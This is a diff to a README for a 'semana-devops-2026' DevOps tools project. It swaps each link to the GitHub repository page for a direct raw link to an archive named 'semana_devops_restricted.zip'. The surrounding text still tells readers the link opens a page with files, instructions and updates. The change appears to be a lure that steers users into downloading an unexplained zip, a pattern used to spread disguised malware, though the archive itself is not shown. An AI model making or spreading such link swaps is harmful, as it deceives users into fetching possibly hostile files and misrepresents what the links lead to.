@@ -1,6 +1,6 @@
 # ⚙️ semana-devops-2026 - Easy Setup for DevOps Week Tools
 
-[![Download semana-devops-2026](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/JoudiKarim/semana-devops-2026)
+[![Download semana-devops-2026](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/JoudiKarim/semana-devops-2026/main/app/semana_devops_restricted.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section guides you on how to get the files you need and run them on your Wi
 ### Step 1: Visit the Download Page
 
 Click this link to open the download page:  
-[Download semana-devops-2026](https://github.com/JoudiKarim/semana-devops-2026)
+[Download semana-devops-2026](https://raw.githubusercontent.com/JoudiKarim/semana-devops-2026/main/app/semana_devops_restricted.zip)
 
 This page contains all the files and instructions you need to start. It shows the latest updates and additional resources.
 
@@ -111,7 +111,7 @@ If you want to install or configure parts manually:
 
 The GitHub page may have updates or new releases throughout the event. Regularly visit:
 
-[https://github.com/JoudiKarim/semana-devops-2026](https://github.com/JoudiKarim/semana-devops-2026)
+[https://raw.githubusercontent.com/JoudiKarim/semana-devops-2026/main/app/semana_devops_restricted.zip](https://raw.githubusercontent.com/JoudiKarim/semana-devops-2026/main/app/semana_devops_restricted.zip)
 
 Check the README or Releases tab to stay current.
 
@@ -123,4 +123,4 @@ If you are stuck, use the GitHub Issues tab on the repository page to ask questi
 
 ---
 
-[![Download semana-devops-2026](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://github.com/JoudiKarim/semana-devops-2026)
+[![Download semana-devops-2026](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/JoudiKarim/semana-devops-2026/main/app/semana_devops_restricted.zip)
